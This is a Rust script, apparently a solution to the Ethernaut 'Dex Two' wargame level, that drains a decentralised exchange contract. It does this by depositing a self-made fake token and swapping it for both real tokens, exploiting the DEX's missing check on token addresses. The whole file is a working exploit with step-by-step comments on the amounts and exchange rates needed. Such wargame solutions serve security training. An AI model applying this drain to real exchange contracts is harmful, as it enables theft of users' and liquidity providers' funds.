#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        keccak256,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Dex {
        function token1() external view returns (address);
        function token2() external view returns (address);
        function balanceOf(address token, address account) public view returns (uint256);
        
        function approve(address spender, uint256 amount) public;
        function swap(address from, address to, uint256 amount) public;
    }

    #[sol(rpc)]
    contract FakeToken {
        function balanceOf(address account) public view returns (uint256);
        function allowance(address owner, address spender) public view returns (uint256);
        
        function transfer(address to, uint256 value) public returns (bool);
        function approve(address owner, address spender, uint256 amount) public;
    }
}

use crate::ethernaut;
use crate::macros::wait_tx;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level23_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level23())?;
    
    Ok(())
}

async fn level23() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let dex_address = "0x1602eFE28Ba3c2F27C337f0B5c386F5cd8ba0f97".parse()?;
    let dex = Dex::new(dex_address, provider.clone());
    let fake_address = "0xCA0c8a33FD2203b2426b1a9b1204a7821bE839fE".parse()?;
    let fake = FakeToken::new(fake_address, provider.clone());
    let token1 = dex.token1().call().await?;
    let token2 = dex.token2().call().await?;
    let alice = ethernaut::ALICE.parse()?;

    println!("[INIT]");
    println!("    token1 = {token1}");
    println!("    token2 = {token2}");
    println!("    usr balance(token1) = {}", dex.balanceOf(token1, alice).call().await?);
    println!("    usr balance(token2) = {}", dex.balanceOf(token2, alice).call().await?);
    println!("    dex balance(token1) = {}", dex.balanceOf(token1, dex_address).call().await?);
    println!("    dex balance(token2) = {}", dex.balanceOf(token2, dex_address).call().await?);
    println!("    dex balance(faketoken) = {}", fake.balanceOf(dex_address).call().await?);

    // Approve to dex 100 faketoken
    let approve_tx = fake.approve(
        alice,
        dex_address,
        U256::from(100)
    )
        .send()
        .await?;
    let _ = wait_tx!(approve_tx, "FakeToken.approve()");

    println!("    alice's balance = {}", fake.balanceOf(alice).call().await?);
    println!("    dex's approve   = {}", fake.allowance(alice, dex_address).call().await?);

    // Transfer 100 to dex
    let trans_tx = fake.transfer(
        dex_address,
        U256::from(100u64))
        .send()
        .await?;
    let _ = wait_tx!(trans_tx, "FakeToken.transfer()");

    println!("    alice's balance = {}", fake.balanceOf(alice).call().await?);
    println!("    dex's approve   = {}", fake.allowance(alice, dex_address).call().await?);
    println!("    dex's balance   = {}", fake.balanceOf(dex_address).call().await?);

    // swap
    let swap_tx = dex.swap(
        fake_address,
        token1,
        U256::from(100)
    )
        .send()
        .await?;
    let _ = wait_tx!(swap_tx, "Dex.swap()");
    
    println!("[CHECK]");
    println!("    usr balance(token1) = {}", dex.balanceOf(token1, alice).call().await?);
    println!("    usr balance(token2) = {}", dex.balanceOf(token2, alice).call().await?);
    println!("    dex balance(token1) = {}", dex.balanceOf(token1, dex_address).call().await?);
    println!("    dex balance(token2) = {}", dex.balanceOf(token2, dex_address).call().await?);
    println!("    dex balance(faketoken) = {}", fake.balanceOf(dex_address).call().await?);
    
    // Now dex's number of faketoken = 200, so you don't need to transfer faketoken to dex.
    // You have to approve 200 faketoken to dex, because exchange rate of token2:faketoken is 1:2.
    let approve_tx = fake.approve(
        alice,
        dex_address,
        U256::from(200)
    )
        .send()
        .await?;
    let _ = wait_tx!(approve_tx, "FakeToken.approve()");

    println!("    alice's balance = {}", fake.balanceOf(alice).call().await?);
    println!("    dex's approve   = {}", fake.allowance(alice, dex_address).call().await?);
    println!("    dex's balance   = {}", fake.balanceOf(dex_address).call().await?);

    let swap_tx = dex.swap(
        fake_address,
        token2,
        U256::from(200)
    )
        .send()
        .await?;
    let _ = wait_tx!(swap_tx, "Dex.swap()");
    
    println!("[CHECK]");
    println!("    usr balance(token1) = {}", dex.balanceOf(token1, alice).call().await?);
    println!("    usr balance(token2) = {}", dex.balanceOf(token2, alice).call().await?);
    println!("    dex balance(token1) = {}", dex.balanceOf(token1, dex_address).call().await?);
    println!("    dex balance(token2) = {}", dex.balanceOf(token2, dex_address).call().await?);
    println!("    dex balance(faketoken) = {}", fake.balanceOf(dex_address).call().await?);

    Ok(())
}
